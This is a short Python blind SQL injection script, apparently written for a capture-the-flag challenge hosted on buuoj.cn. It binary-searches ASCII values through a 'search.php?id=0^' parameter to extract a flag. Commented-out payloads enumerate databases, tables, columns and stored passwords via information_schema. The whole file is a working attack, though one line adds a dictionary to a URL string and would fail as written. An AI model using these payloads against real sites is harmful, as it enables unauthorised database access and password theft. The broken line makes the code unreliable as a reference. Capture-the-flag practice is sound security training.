import requests

url = "http://f3720e88-4045-4290-86c8-3fcbad7baa55.node3.buuoj.cn/search.php?id=0^"

flag = ''
i = 0

while True:
    i = i + 1
    head = 32
    tail = 127

    while head < tail:
        mid = (head + tail) // 2
        payload ={"id" : "0^" + "(ascii(substr((select(flag)from(flag)),{0},1))>{1})".format(i,mid)}
        #payload="(ascii(substr((select(group_concat(schema_name))from(information_schema.schemata)),{0},1))>{1})".format(i,mid)
        #payload="(ascii(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema)='geek'),{0},1))>{1})".format(i,mid)
        #payload="(ascii(substr((select(group_concat(column_name))from(information_schema.columns)where(table_name)='F1naI1y'),{0},1))>{1})".format(i,mid)
        #payload = "(ascii(substr((select(group_concat(password))from(F1naI1y)),{0},1))>{1})".format(i,mid)
        response = requests.get(url+payload)
       #response = requests.get(url,data=payload)
        if "Click" in response.text:
            head = mid + 1
        else:
            tail = mid 

    if head != 32:
        flag += chr(head)
    else:
        break
    print(flag)